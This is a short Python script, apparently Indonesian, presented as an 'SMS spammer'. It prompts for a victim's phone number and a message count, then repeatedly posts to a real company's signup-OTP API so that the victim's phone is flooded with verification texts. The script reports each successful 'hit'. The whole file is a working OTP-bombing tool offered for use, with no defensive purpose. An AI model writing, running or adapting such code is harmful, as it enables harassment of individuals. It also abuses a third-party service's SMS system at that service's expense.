import requests

print('===============================================')
print('PICO SMS SPAMMER')
print('Serang Target Sampai Minta Ampun!')
print('maked with love by : ~pico')
print('===============================================')

no = int(input('masukan no target nya brow :  '))
jum = int(input('masukan jumlah pesan : '))

json = {'phone' :no}
jumlahpes = 0
for res in range(jum):
    res = requests.post('https://cmsapi.mapclub.com/api/signup-otp',json=json)
    if "ok" in res.text :
        jumlahpes +=1
        print(jumlahpes, 'berhasil terhantam brow')        
    else:       
        print('error brow , coba lagi deh ===> ', res.text)
